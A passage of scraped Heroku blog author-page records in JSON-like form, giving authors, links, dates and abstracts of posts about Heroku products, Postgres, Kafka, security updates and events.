service providers structure their businesses and how users interact with them. Today we're happy to announce the launch of the updated Heroku Add-ons site . The goal of the new site is to make it even easier to find, compare,... Read more", "date": "2014-03-11,"},
{"website": "Heroku", "title": null, "author": ["Will Leinweber"], "link": "https://blog.heroku.com/authors/will-leinweber", "abstract": "Introducing pg:diagnose news August 12, 2014 Will Leinweber Introducing pg:diagnose, a new tool for finding and fixing performance issues with your Heroku Postgres database. The heroku pg:diagnose CLI command unlocks the wealth of built-in information that PostgreSQL stores about its own health and performance , presenting it in simple report that makes identifying and correcting common database problems effortless. At Heroku, we not only run dozens of internal Postgres systems but also have the privilege of running the Postgres systems of many, many customer databases. In doing this, we've encountered and fixed every problem imaginable – and many that were previously unimaginable. Because of that, we have built up a tremendous amount of... Read more", "date": "2014-08-12,"},
{"website": "Heroku", "title": null, "author": ["William Gradin"], "link": "https://blog.heroku.com/authors/william-gradin", "abstract": "Heroku Connect:  Now with Free Salesforce API Calls news July 14, 2015 William Gradin Heroku Connect provides seamless data synchronization between Heroku Postgres databases and Salesforce organizations. Without writing a single line of integration code, you can sync hundreds of millions of Salesforce records in near real time using a simple point-and-click UI. Resiliency and data consistency are assured with robust automatic error recovery and easy to use Salesforce centric logging capabilities. We’re pleased to announce that beginning July 2, 2015, Heroku Connect’s data synchronization with your Salesforce organization -- which relies on the SOAP API -- will no longer be constrained by your Salesforce API usage limits . Customers can now focus on using Heroku Connect to... Read more", "date": "2015-07-14,"},
{"website": "Heroku", "title": "Heroku Streaming Data Connectors Are Now Generally Available", "author": ["Scott Truitt"], "link": "https://blog.heroku.com/heroku-streaming-data-connectors", "abstract": "Heroku Streaming Data Connectors Are Now Generally Available Posted by Scott Truitt October 08, 2020 Listen to this article This summer, we announced the beta release of our new streaming data connectors between Heroku Postgres and Apache Kafka on Heroku. These connectors make Change Data Capture (CDC) possible on Heroku with minimal effort. Anyone with a Private or Shield Space, as well as a Postgres and an Apache Kafka add-on in that space, can use Streaming Data Connectors today at no additional charge. Customers use connectors to build streaming data pipelines between Salesforce and external stores like a Snowflake data lake or an AWS Kinesis queue for integration with other data sources. They also refactor monoliths into microservices, implement an event-based architecture, archive data in lower-cost storage services, and more. Other customers use connectors to build a unified event feed from data in multiple Salesforce and Work.com orgs, which provides a centralized Kafka-based Event Bus to take action on all org activity. Multiple integrations are possible in this configuration, including Heroku apps in dynos, Salesforce Flow, Mulesoft, and more. And we’ve uncovered new opportunities for further enhancements and integrations in the months to come. We’ve also made multiple improvements to the beta product to prevent lost events during a Postgres maintenance and minimize lost events during a Postgres failover scenario. We also added an update command to make changes to tables or columns after initial provisioning and updated Debezium to the latest 1.3 release. It’s as easy as heroku data:connectors:create To get started, make sure you have the latest CLI plugin . Then create a connector by identifying the Postgres source and Apache Kafka store by name, specifying which table(s) to include, and optionally listing which columns to exclude: heroku data:connectors:create \\\n  --source postgresql-neato-98765 \\\n  --store kafka-lovely-12345 \\\n  --table public.posts --table public.users \\\n  --exclude-column public.users.password See the full instructions and best practices for more detail. Feedback Welcome Streaming Data Connectors open a new frontier of data-driven development for our customers and us. We look forward to seeing what you can do with it. Ready to get started? Contact sales . work.com postgres kafka apache kafka Heroku Postgres data streaming data integration cdc", "date": "2020-10-08,"},
{"website": "Heroku", "title": null, "author": ["Email", "Will Farrington"], "link": "https://blog.heroku.com/authors/will-farrington", "abstract": "Making Time to Save You Time: How We Sped Up Time-Related Syscalls on Dynos engineering July 16, 2020 Will Farrington I work on Heroku’s Runtime Infrastructure team, which focuses on most of the underlying compute and containerization here at Heroku. Over the years, we’ve tuned our infrastructure in a number of ways to improve performance of customer dynos and harden security. We recently received a support ticket from a customer inquiring about poor performance in two system calls (more commonly referred to as syscalls) their application was making frequently: clock_gettime(3) and gettimeofday(2) . In this customer’s case, they were using a tool to do transaction tracing to monitor the performance of their application. This tool made many such system calls to measure how long different parts of their... Read more", "date": "2020-07-16,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "Facebook", "GitHub", "LinkedIn", "Wesley Beary", "Wesley Beary"], "link": "https://blog.heroku.com/authors/wesley-beary", "abstract": "Introducing the Heroku HTTP API Toolkit engineering May 14, 2014 Wesley Beary Today we’re open sourcing the toolchain Heroku uses to design, document, and consume our APIs. We hope this shows how Heroku thinks about APIs and gives you new tools to create your own APIs. Read more Heroku Platform API, Now Available in Public Beta news May 30, 2013 Wesley Beary Today, we are excited to release our new platform API into public beta, turning Heroku into an extensible platform for building new and exciting services. Our platform API derives from the same command-and-control API we use internally, giving entrepreneurs and innovators unprecedented power to integrate and extend our platform. Some of the uses we’ve imagined include: Building mobile apps that control Heroku from smartphones and tablets; Combining Heroku with other services and integrating with developer tools; Automating custom workflows with programmatic integration to Heroku The platform API empowers developers to automate, extend and combine Heroku with other services. You can use... Read more", "date": "2014-05-14,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "Wade Wegner"], "link": "https://blog.heroku.com/authors/wade-wegner", "abstract": "Join us for a Live Q&A Chat with Salesforce Product Managers news February 19, 2020 Wade Wegner Wade Wegner is SVP of Product for Salesforce Platform. On a recent and all-too-short trip to London, I was humbled to have developers in the community spend time with me and other product managers at the UK Salesforce Tower. Building on the massively popular open dialogue with developers that we initiated at Dreamforce last year, our discussion was a transparent conversation with developers who have been building on the Salesforce platform. I was incredibly inspired by the developers local to the London office who spent time after their work day to engage in meaningful conversation about what they wanted to see for the future of the platform, as well as answer questions about tooling and... Read more", "date": "2020-02-19,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "LinkedIn", "Wade"], "link": "https://blog.heroku.com/authors/wade-winright", "abstract": "Bug Bounties and Black Swans: How Heroku Expects the Unexpectable engineering March 26, 2019 Wade There’s obviously more to security than humans, technology, and vendors with all of their implementations and expertise. At Heroku we believe that security is a byproduct of excellence in engineering. All too often, software is written solely with the happy path in mind, and security assurances of that software has its own dangerous assumptions. A mature security program should challenge assumptions of security controls, move to testing continuously, and prepare for the unexpectable. This means asking hard questions about the bigger picture. Think bigger than the development lifecycle, backing away from the fixations of confirming effective corrections and remediations. This means taking... Read more", "date": "2019-03-26,"},
{"website": "Heroku", "title": null, "author": ["Email", "Vikram Rana", "Vikram Rana", "Vikram Rana", "Vikram Rana"], "link": "https://blog.heroku.com/authors/vikram-rana", "abstract": "Heroku in 2018: Advancing Developer Experience, Trust & Compliance, and Data news January 09, 2019 Vikram Rana 2018 was an amazing year for Heroku and our customers. We want to extend a big thank you for your feedback, beta participation, and spirit of innovation, which inspires us every day to continuously improve and advance the platform. In the past year, we released a range of new features to make the developer experience more productive, more standards based, and more open. We achieved significant compliance milestones, provided trust controls for creating multi-cloud apps, and improved our existing lineup of data services. With that, we’d like to take a moment and look back at some of the highlights from 2018. We hope you enjoy it, and we look forward to an even more exciting 2019! ... Read more Managing Real-time Event Streams and SQL Analytics with Apache Kafka on Heroku, Amazon Redshift, and Metabase engineering December 06, 2018 Vikram Rana Building a SaaS product, a system to handle sensor data from an internet-connected thermostat or car, or an e-commerce store often requires handling a large stream of product usage data, or events. Managing event streams lets you view, in near real-time, how users are interacting with your SaaS app or the products on your e-commerce store; this is interesting because it lets you spot anomalies and get immediate data-driven feedback on new features. While this type of stream visualization is useful to a point, pushing events into a data warehouse lets you ask deeper questions using SQL. In this post, we’ll show you how to build a system using Apache Kafka on Heroku to manage and visualize... Read more The Heroku 2016 Retrospective news January 02, 2017 Vikram Rana As we begin 2017, we want to thank you for supporting Heroku. Your creativity and innovation continues to inspire us, and pushed us to deliver even more new products and features in 2016. We especially want to thank everyone who helped us by beta testing, sharing Heroku with others, and providing feedback. Here are the highlights of what became generally available in 2016. Advancing the Developer Experience Heroku Pipelines A new way to structure, manage and visualize continuous delivery. Heroku Review Apps Test code at a shareable URL using disposable Heroku apps that spin up with each GitHub pull request. Free SSL for Apps on Paid Dynos Get SSL encryption on custom domains for... Read more The Heroku 2015 Retrospective news January 06, 2016 Vikram Rana As we start this New Year, we wanted to give you a recap of our 2015, a year filled with a lot of new products and features. We especially want to express our gratitude to everyone who helped us with inspiration, beta testing, and feedback. In case you missed anything, here are the highlights of 2015. Advancing the Developer Experience Review Apps With Review Apps, for every GitHub pull request, Heroku spins up a disposable Review App so everyone on your team can see the changes live, speeding up decisions and leading to higher quality apps. New Dynos Build apps at any scale on Heroku with a new lineup of dyno types and prices: Performance-L, Performance-M, Standard 1X and 2X,... Read more", "date": "2019-01-09,"},
{"website": "Heroku", "title": null, "author": ["Email", "Tushar Pradhan"], "link": "https://blog.heroku.com/authors/tpradhan-heroku-com", "abstract": "Enhancing Security - MFA with More Options, Now Available for All Heroku Customers news April 12, 2021 Tushar Pradhan Customer Trust is our highest priority at Salesforce and Heroku. It’s more important than ever to implement stronger security measures in light of increasing security threats that could affect services and apps that are critical to businesses and communities. We’re pleased to announce that all Heroku customers can now take advantage of the security offered by Multi-Factor Authentication (MFA) . We encourage you to check out these new MFA features and add another layer of protection to your account by enabling MFA. As we announced in February 2021, all Salesforce customers are required to enable MFA starting Feb 1, 2022 . There’s no reason to wait - it takes a couple of simple steps to... Read more", "date": "2021-04-12,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "LinkedIn", "Trey Ford"], "link": "https://blog.heroku.com/authors/trey-ford", "abstract": "Meltdown and Spectre Security Update news January 04, 2018 Trey Ford UPDATE: Friday, January 5 19:07 PST As of 13:30 PST, AWS completed their patch deployment addressing tenant isolation threats. AWS reports they have restored the expected multi-tenancy protections similar to dedicated hardware, which leaves Heroku to address the kernel vulnerabilities in runtime host operating systems. Heroku Performance, Private, and Shield dynos feature varying degrees of isolation from potentially hostile neighbors. However, the shared Common Runtime carries our highest priority for Meltdown (variant 3) mitigation work due to the nature of its shared infrastructure. The ideal fix is to deploy the updated kernel from Canonical prior to the release of functional... Read more", "date": "2018-01-04,"},
{"website": "Heroku", "title": null, "author": ["Tom Maher", "Tom Maher", "Tom Maher"], "link": "https://blog.heroku.com/authors/tom-maher", "abstract": "OAuth as Single Sign On news November 13, 2013 Tom Maher Today, we're announcing the release of a key part of our authentication infrastructure - id.heroku.com - under the MIT license. This is the service that accepts passwords on login and manages all things OAuth for our API. The repo is now world-readable at https://github.com/heroku/identity . Pull requests welcome. While OAuth was originally designed to allow service providers to delegate some access on behalf of a customer to a third party, and we do use it that way too, Heroku also uses OAuth for SSO. We'd like to take this opportunity to provide a technical overview. A quick bit of terminology We use the term \"properties\" to refer to public-facing sites owned and... Read more Extended Validation SSL Certificates on Heroku news October 07, 2013 Tom Maher Heroku is now using Extended Validation SSL Certificates for most of our Heroku-owned applications. This allows you to tell at a glance if an URL belongs to Heroku itself, or is merely hosted on us. Applications in our legacy “Bamboo” stack are hosted under the heroku.com DNS domain, which has historically made it difficult for people to differentiate between Heroku-owned apps (e.g., id.heroku.com, dashboard.heroku.com) and customer applications. We believe the extra UI indication will prove useful in solving this problem. For more information, see \"EV SSL Certificates and Heroku-owned Applications\" on Heroku Dev Center . -Tom Maher Heroku Security Team Read more The Heroku Security Researcher Hall of Fame news August 26, 2013 Tom Maher Starting today, Heroku would like to publicly thank all the independent security researchers who have practiced responsible disclosure and helped us remediate issues. The Heroku Security Researcher Hall of Fame lists these researchers, along with the date of their initial report. If you've found a new security issue on our platform, we'd love to hear from you . Our intent is for this list to be comprehensive, going back to our beginning. If you’ve reported a vulnerability to us in the past, and you’re either not listed or you’d like your listing changed (e.g., typos, change a link) or removed entirely, just let us know. Ground Rules: Customer applications are ineligible for... Read more", "date": "2013-11-13,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "Tom Crayford", "Tom Crayford", "Tom Crayford"], "link": "https://blog.heroku.com/authors/tom-crayford", "abstract": "Pulling the Thread on Kafka's Compacted Topics engineering January 11, 2017 Tom Crayford At Heroku, we're always working towards improving operational stability with the services we offer. As we recently launched Apache Kafka on Heroku , we've been increasingly focused on hardening Apache Kafka, as well as our automation around it. This particular improvement in stability concerns Kafka's compacted topics, which we haven't talked about before. Compacted topics are a powerful and important feature of Kafka, and as of 0.9, provide the capabilities supporting a number of important features. Meet the Bug The bug we had been seeing is that an internal thread that's used by Kafka to implement compacted topics (which we'll explain more of shortly) can die in... Read more Dawn of the Dead Ends: Fixing a Memory Leak in Apache Kafka news August 23, 2016 Tom Crayford At Heroku, we're always working towards increased operational stability with the services we offer. As we recently launched the beta of Apache Kafka on Heroku , we've been running a number of clusters on behalf of our beta customers. Over the course of the beta, we have thoroughly exercised Kafka through a wide range of cases, which is an important part of bringing a fast-moving open-source project to market as a managed service. This breadth of exposure led us to the discovery of a memory leak in Kafka, having a bit of an adventure debugging it, and then contributing a patch to the Apache Kafka community to fix it. Issue Discovery For the most part, we’ve seen very few issues... Read more Apache Kafka 0.10 engineering May 27, 2016 Tom Crayford At Heroku, we're always striving to provide the best operational experience with the services we offer. As we’ve recently launched Heroku Kafka, we were excited to help out with testing of the latest release of Apache Kafka, version 0.10, which landed earlier this week. While testing Kafka 0.10, we uncovered what seemed like a 33% throughput drop relative to the prior release. As others have noted , “it’s slow” is the hardest problem you’ll ever debug, and debugging this turned out to be very tricky indeed. We had to dig deep into Kafka’s configuration and operation to uncover what was going on. Background We've been benchmarking Heroku Kafka for some time, as we prepared for the... Read more", "date": "2017-01-11,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "GitHub", "LinkedIn", "Timothée Peignier", "Timothée Peignier", "Timothée Peignier"], "link": "https://blog.heroku.com/authors/timothee-peignier", "abstract": "A Few Postgres Essentials news December 08, 2016 Timothée Peignier Postgres is our favorite database—it’s reliable, powerful and secure. Here are a few essential tips learned from building, and helping our customers build, apps around Postgres. These tips will help ensure you get the most out of Postgres, whether you’re running it on your own box or using the Heroku Postgres add-on. Use a Connection Pooler Postgres connections are not free , as each established connection has a cost. By using a connection pooler, you’ll reduce the number of connections you use and reduce your overhead. Most Postgres client libraries include a built-in connection pooler; make sure you’re using it. You might also consider using our pgbouncer buildpack if your application... Read more Real-World Redis Tips news July 28, 2016 Timothée Peignier Redis might sound like it’s just a key/value store, but its versatility makes it a valuable Swiss Army knife for your application. Caching, queueing, geolocation, and more: Redis does it all. We’ve built (and helped our customers build) a lot of apps around Redis over the years, so we wanted to share a few tips that will ensure you get the most out of Redis, whether you’re running it on your own box or using the Heroku Redis add-on. Use a Connection Pooler By using a connection pooler, you'll reduce the connection overhead and therefore speed up operations while reducing the number of connections you use. Most Redis libraries will provide you with a specific connection pooler... Read more Instrumentation by Composition engineering October 22, 2014 Timothée Peignier Heroku provides many instrumentations for your app out of the box through our new Heroku developer experience . We have open-sourced some of the tools used to instrument Heroku apps, but today’s focus will be on instruments , a Go library that allows you to collect metrics over discrete time intervals. Read more", "date": "2016-12-08,"},
{"website": "Heroku", "title": null, "author": ["Tim Lang", "Tim Lang"], "link": "https://blog.heroku.com/authors/tim-lang", "abstract": "Announcing the Sydney, Australia Region for Heroku Private Spaces news January 30, 2017 Tim Lang Today we’re happy to announce that the Sydney, Australia region is now generally available for use with Heroku Private Spaces . Sydney joins Virginia, Oregon, Frankfurt, and Tokyo as regions where Private Spaces can be created by any Heroku Enterprise user. Developers can now deploy Heroku apps closer to customers in the Asia-Pacific area to reduce latency and take advantage of the advanced network & trust controls of Spaces to ensure sensitive data stays protected. Usage To create a Private Space in Sydney, select the Spaces tab in Heroku Dashboard in Heroku Enterprise, then click the “New Space” button and choose “Sydney, Australia” from the the Space Region dropdown. After a... Read more Heroku Private Spaces Now Generally Available news January 26, 2016 Tim Lang Today Heroku is announcing that Heroku Private Spaces is generally available. Introduced in beta in September, Private Spaces is a new Heroku runtime designed from the ground up to meet the trust and control requirements of the most demanding applications. This new architecture enables Private Spaces to deliver the best of both worlds: the easy and powerful Heroku developer experience, combined with the network and trust controls historically only available in on-premise, behind-the-firewall deployments. Made available as part of Heroku Enterprise, Private Spaces makes cloud-based PaaS ready for the most critical enterprise applications. Heroku Spaces are designed to fit in seamlessly... Read more", "date": "2017-01-30,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "Terence Lee", "Joe Kutner", "Terence Lee", "Terence Lee", "Terence Lee"], "link": "https://blog.heroku.com/authors/terence-lee", "abstract": "Turn Your Code into Docker Images with Cloud Native Buildpacks engineering April 03, 2019 Terence Lee and Joe Kutner When we open-sourced buildpacks nearly seven years ago, we knew they would simplify the application deployment process. After a developer runs git push heroku master , a buildpack ensures the application's dependencies and compilation steps are taken care of as part of the deploy. As previously announced , we've taken the same philosophies that made buildpacks so successful and applied them towards creating Cloud Native Buildpacks (CNB), a standard for turning source code into Docker images without the need for Dockerfiles. In this post, we'll take a look at how CNBs work, how they aim to solve many of the problems that exist with Dockerfile, and how you can use them with the... Read more Buildpacks Go Cloud Native news October 03, 2018 Terence Lee Your Heroku application's journey to production begins with a buildpack that detects what kind of app you have, what tools you need to run, and how to tune your app for peak performance. In this way, buildpacks reduce your operational burden and let you to spend more time creating value for your customers. That's why we're excited to announce a new buildpack initiative with contributions from Heroku and Pivotal. The Cloud Native Computing Foundation (CNCF) has accepted Cloud Native Buildpacks to the Cloud Native Sandbox . Cloud Native Buildpacks turn source code into Docker images. In doing so, they give you more power to customize your runtime while making your apps more... Read more Ruby 2.3 on Heroku with Matz news December 24, 2015 Terence Lee Happy Holidays from Heroku. Congratulations to the ruby-core team on a successful 2.3.0 release , which is now available on Heroku -- you can learn more about Ruby on Heroku at heroku.com/ruby . We had the pleasure of speaking with Matz (Yukihiro Matsumoto), the creator of Ruby and Chief Ruby Architect at Heroku, about the release. What’s New in Ruby 2.3: Interview with Matz Ruby releases happen every year on Christmas day. Why Christmas? Ruby was originally my pet project, my side project. So releases usually happened during my holiday time. Now, it’s a tradition. It’s ruby-core’s gift to the Ruby community. Do you have any favorite features coming in Ruby 2.3? I’m excited about the... Read more RailsConf 2013 news April 26, 2013 Terence Lee Developers are worthy of great experiences and at Heroku we aim to help improve this. Whether its making it easier to prepare your application for production on Heroku, not having to worry about security updates in your database , or getting notified of the latest rails vulnerability we want to make the world better for developers. This extends beyond the Heroku platform as well. For instance, our Ruby Task Force contributes back to projects like Ruby on Rails , Bundler , Code Triage , and Rails Girls . Likewise, we aim to do everything we can to make your RailsConf experience better. Whether it is relaxing with some sake or getting performance advice for your application, we have a slew of... Read more", "date": "2019-04-03,"},
{"website": "Heroku", "title": null, "author": ["Tammy Contreras", "Tammy Contreras"], "link": "https://blog.heroku.com/authors/tammy-contreras", "abstract": "Meet Heroku Events news August 08, 2013 Tammy Contreras Throughout the year we participate in a lot of conferences, hackathons, meet-ups, educational programs, and open source projects. At each and every one, we are inspired by the accomplishments, projects, and people we get to meet there. We welcome the opportunity to talk to you about your projects, answer your questions and share some awesome Heroku swag. If you see us at an event, please stop by and say \"Hi.\" Each month you can find out where Heroku will be by going to our events page , on Twitter , or on Facebook where you can also see where we've been. So what's happening in August? The month started off on August 3rd with Richard Schneeman @schneems and Harold Gimenez... Read more Heroku at WWDC news June 04, 2013 Tammy Contreras Each year, more than 5,000 iOS and Mac developers from over 50 different countries gather at Moscone Center West for Apple's Worldwide Developer Conference , or WWDC. It's the one week developers get to learn about all of the shiny new devices and APIs that they'll use to make their next great apps. Heroku is excited to be sponsoring and organizing a great lineup of events next week: AltWWDC Labs For anyone who didn't get a ticket to the main event this year or is looking for a change of pace from the official schedule, AltWWDC is definitely worth a look. This open alternative to Apple's Worldwide Developer Conference features sessions and labs from such luminaries... Read more", "date": "2013-08-08,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "Stella Cotton"], "link": "https://blog.heroku.com/authors/stella", "abstract": "Building a Service-oriented Architecture with Rails and Kafka engineering January 14, 2019 Stella Cotton This blog post is adapted from a talk given by Stella Cotton at RailsConf 2018 titled \" So You’ve Got Yourself a Kafka .\" Hey, everybody. We're gonna get started. I hope that you're here to listen to me talk about Kafka, 'cause that's the room that you are in. So, yeah. First things first, my name is Stella Cotton. I am an engineer at Heroku. And like I said, I'm gonna talk to you today about Kafka. You might have heard that Heroku offers Kafka as a service. We have got a bunch of hosted plans, from tiny plans to giant plans. We have an engineering team that's strictly dedicated to doing cool stuff to get Kafka running on Heroku in super high capacity.... Read more", "date": "2019-01-14,"},
{"website": "Heroku", "title": null, "author": ["Email", "Chris Marino", "Srini Nirmalgandhi"], "link": "https://blog.heroku.com/authors/srini", "abstract": "Extend Flows with Heroku Compute: An Event-Driven Pattern engineering December 11, 2020 Chris Marino and Srini Nirmalgandhi This post previously appeared on the Salesforce Architects blog. Event-driven application architectures have proven to be effective for implementing enterprise solutions using loosely coupled services that interact by exchanging asynchronous events. Salesforce enables event-driven architectures (EDAs) with Platform Events and Change Data Capture (CDC) events as well as triggers and Apex callouts, which makes the Salesforce Platform a great way to build all of your digital customer experiences . This post is the first in a series that covers various EDA patterns, considerations for using them, and examples deployed on the Salesforce Platform. Expanding the event-driven architecture of the... Read more", "date": "2020-12-11,"},
{"website": "Heroku", "title": null, "author": ["Email", "Sophie DeBenedetto"], "link": "https://blog.heroku.com/authors/sophie-debenedetto", "abstract": "Real-Time Rails: Implementing WebSockets in Rails 5 with Action Cable news May 09, 2016 Sophie DeBenedetto It's been one year since Action Cable debuted at RailsConf 2015, and Sophie DeBenedetto is here to answer the question in the minds of many developers: what is it really like to implement \"the highlight of Rails 5\"? Sophie is a web developer and an instructor at the Flatiron School. Her first love is Ruby on Rails, although she has developed projects with and written about Rails, Ember and Phoenix. Recent years have seen the rise of \"the real-time web.\" Web apps we use every day rely on real-time features—the sort of features that let you see new posts magically appearing at the top of your feeds without having to lift a finger. While we may take those features... Read more", "date": "2016-05-09,"},
{"website": "Heroku", "title": null, "author": ["Sharon Schmidt"], "link": "https://blog.heroku.com/authors/sharon-schmidt", "abstract": "Interested in talking with Heroku at Rubyconf? news November 12, 2009 Sharon Schmidt We’ve secured a two room suite at the Rubyconf event hotel for the Thursday night of the conference. A number of Heroku’s team members including James Lindenbaum, Adam Wiggins, Morten Bagai, Oren Teich, Todd Matthews, Pedro Belo and Blake Mizerany will be hanging out, talking shop and looking to connect with folks interested in learning more about Heroku. Rubyconf has an exceptional lineup this year and Thursday is sure to rock it with talks scheduled from 9am-6pm and Lightening Talks beginning at 8pm. Because we don’t want you to miss any of this years excellent program, we’re planning to stick around for at least an hour after the Lightening Talks end. But of... Read more", "date": "2009-11-12,"},
{"website": "Heroku", "title": null, "author": ["Shanley Kane", "Shanley Kane", "Shanley Kane", "Shanley Kane", "Shanley Kane", "Shanley Kane", "Shanley Kane", "Shanley Kane"], "link": "https://blog.heroku.com/authors/shanley-kane", "abstract": "How Travis CI Uses Heroku to Scale Their Platform news September 03, 2013 Shanley Kane Editor's note: This is a guest post from Mathias Meyer of Travis CI. Travis CI is a continuous integration and deployment platform. It started out as a project to offer a free platform for the open source community to run their tests and builds on. Over the past two years, Travis CI has grown, a lot. What started out with a single server running just a few hundred tests a day turned into a platform used by thousands of open source projects and hundreds of companies for their public and private projects. Travis CI is currently serving more than 62,000 active open source projects, with 32,000 daily builds, and 3,000 private projects with 11,000 daily builds. Heroku is an important part... Read more Heroku Postgres at Postgres Open and PostgreSQL Conf EU news August 27, 2013 Shanley Kane The Heroku Postgres team is hitting the road in coming months and we’d love to connect with you. If you’d like to meet up with us at any of the events below, drop us a line or Tweet us @HerokuPostgres . The first opportunity to connect with us is in September at Postgres Open . If you’ve already got your tickets for Postgres Open, join us for drinks and/or pizza at Clark Ale House on Tuesday, September 17, and make sure to check out talks by Craig Kerstiens and Peter Geoghegan . If you don’t already have your ticket for Postgres Open, but are interested in going, we’ve got a chance for you to win a ticket from us for free. Win A Ticket to Postgres Open We’re giving away 3 tickets to PG... Read more How We Use Heroku Postgres Dataclips to Drive Our Business news August 07, 2013 Shanley Kane Heroku Postgres brings the Heroku flow to your database, offering safe and straightforward provisioning, scaling, development and collaboration. Traditionally, generating and sharing data from within databases has been inconvenient and challenging. What if you could safely and easily capture and share the data you need to drive your business? Dataclips, available on all Heroku Postgres production and starter databases, let you run SQL queries against your data and share the results in an easy, visual way with your team members. Dataclips can be downloaded or shared via URLs, are downloadable and exportable in many formats, and are executed via a read-only transaction so your data stays... Read more Releases and Rollbacks news July 25, 2013 Shanley Kane Heroku tools let you create robust, healthy workflows for your apps, from development to production to ongoing delivery. Add other developers to your app with heroku sharing , create homogeneous staging and production apps with heroku fork , and quickly deploy directly from staging to production with pipelines . Deploying quickly and often is awesome, but with multiple developers and multiple deployments each day, how do you see and manage changes to your app over time? And what happens if you accidentally deploy bad code? We address these issues with two aspects of the Heroku platform - heroku releases and heroku rollback . heroku releases brings simplicity and visibility to application... Read more Logging on Heroku news July 15, 2013 Shanley Kane Logs tell the story of your app - a continuous, living stream of events, changes and behaviors. Logs let you rapidly identify and act on critical events, debug issues in your code, and analyze trends to make better decisions over time. But log management is increasingly complex. As apps scale across distributed infrastructure, many independent processes must be tracked and made sense of. Numerous components and backing services each produce their own log streams. Multiple developers may be collaborating on your app, and multiple services must consume its logs. And logs must be useful not only to machines and applications, but to the humans viewing them. Heroku brings simplicity and... Read more Add-ons for Production Apps news July 08, 2013 Shanley Kane Heroku Add-ons are services exposed through the Heroku platform. They are managed by experts, provisioned and scaled in a single command, and consumed by your application as loosely coupled components. This post provides an overview of Add-ons for logging, persistence, caching and monitoring in production apps. Logging heroku addons:add papertrail Logs provide the foundation for trend analysis, error inspection, performance tuning and other processes critical for running production apps. Heroku routes and collates real-time logs from each part of your app, including running processes, system components, API events... even Add-ons themselves. Heroku presents app logs in a single stream... Read more Introducing Heroku Fork news June 27, 2013 Shanley Kane An application is more than source code - it’s executables, generated assets, runtime environments, dependencies, configuration, running processes, backing services and more. What if you could fork your entire app, not just your code? heroku fork lets you create unique, running instances of existing applications right from the command line. These instances are live and available on Heroku immediately so you can change, scale and share them however you want. How It Works You can fork apps you own and apps you’re collaborating on. You must have the Heroku Toolbelt installed to use this feature. Fork an existing application by running the following command: $ heroku fork -a sourceapp... Read more Historical Uptime on Status Site news June 13, 2013 Shanley Kane Until now, Heroku Status has been focused primarily on present platform health - providing current status, uptime for the current month, and recent incident history. Today we're announcing an addition to our status site: a dedicated page to view historical uptime . The new uptime page provides a longer-term perspective on Heroku uptime and incidents - perspective that is critical for transparency and continued trust in the Heroku platform. The new uptime page covers both the US and Europe regions for visibility into uptime where your apps are hosted. This was a top-requested feature with the recent launch of Heroku's Europe region . The uptime page displays per-month uptime going... Read more", "date": "2013-09-03,"},
{"website": "Heroku", "title": null, "author": ["Email", "Sepideh Setayeshfar", "Sepideh Setayeshfar"], "link": "https://blog.heroku.com/authors/sepideh-setayeshfar-2", "abstract": "Announcing New Review Apps: Expanded Options for Greater Control, Automation, and Easier Access news June 16, 2020 Sepideh Setayeshfar Faster application delivery with remote teams is the key to connect with your customers, now more than ever. A few years ago, we released Review Apps with the goal of improving the application development process and team collaboration. Today, we are excited to announce the release of an improved version of Review Apps to general availability. The new version of Review Apps provides easier access management with a new permission system, and more flexibility for complex workflows with public APIs. It also no longer needs a staging, production, or placeholder app to host its configuration and collaborator access; this independence supports easier, more flexible application development. ... Read more Announcing General Availability of Heroku Enterprise Accounts news September 12, 2019 Sepideh Setayeshfar Today we are thrilled to announce the general availability (GA) release of Heroku Enterprise Accounts . All Enterprise Teams associated with a company are nested under an Enterprise Account which delivers a higher level of visibility and accountability. With an Enterprise Account, executives and admins can ensure trust and improved agility with simple fast management of teams, users and expenses, so application development teams can stay focused on the development process. With applications sitting at the core of almost all businesses, collaborative environments that make it possible for users to efficiently work together without security concerns are essential to the success of any... Read more", "date": "2020-06-16,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "LinkedIn", "Scott Truitt", "Scott Truitt", "Scott Truitt", "Scott Truitt", "Scott Truitt", "Scott Truitt", "Scott Truitt", "Scott Truitt", "Scott Truitt", "Scott Truitt"], "link": "https://blog.heroku.com/authors/struitt-heroku-com", "abstract": "Heroku Streaming Data Connectors Are Now Generally Available news October 08, 2020 Scott Truitt This summer, we announced the beta release of our new streaming data connectors between Heroku Postgres and Apache Kafka on Heroku. These connectors make Change Data Capture (CDC) possible on Heroku with minimal effort. Anyone with a Private or Shield Space, as well as a Postgres and an Apache Kafka add-on in that space, can use Streaming Data Connectors today at no additional charge. Customers use connectors to build streaming data pipelines between Salesforce and external stores like a Snowflake data lake or an AWS Kinesis queue for integration with other data sources. They also refactor monoliths into microservices, implement an event-based architecture, archive data in lower-cost... Read more Introducing the Streaming Data Connectors Beta: Capture Heroku Postgres Changes in Apache Kafka on Heroku news July 09, 2020 Scott Truitt Today we are announcing a beta release of our new streaming data connector between Heroku Postgres and Apache Kafka on Heroku. Heroku runs millions of Postgres services and tens of thousands of Apache Kafka services, and we increasingly see developers choosing to start with Apache Kafka as the foundation of their data architecture. But for those who are Postgres-first, it is challenging to adopt without a full app rewrite. Developers want a seamless integration between the two services, and we are delivering it today, at no additional charge, for Heroku Private Spaces and Shield Spaces customers. Moving beyond Postgres and Kafka, the Heroku Data team sees the use cases for data growing... Read more Heroku Shield Redis Is Now Generally Available news June 11, 2020 Scott Truitt We are thrilled to announce that Heroku Shield Redis is now generally available and certified for handling PHI, PII, and HIPAA-compliant data. Heroku Shield Redis is the final missing data service for Heroku Shield, which is an integrated set of Heroku services with additional security features needed for building high compliance applications. All Heroku Managed Data Services — Heroku Connect, Heroku Redis, Heroku Postgres, and Apache Kafka on Heroku — are now fully certified for handling PHI, PII, and HIPAA-compliant data as part of Heroku Shield. Security and compliance come standard with Heroku Shield, so developers and enterprises can focus solely on building great experiences. In... Read more Bring Your Own Key for Heroku Managed Data Services Is Now Generally Available news May 06, 2020 Scott Truitt Security is always top of mind for Heroku customers; COVID-19 has further increased the urgency for enterprises and developers to deliver more mission-critical applications with sensitive and regulated data. Given the needs of our customers, including those in regulated 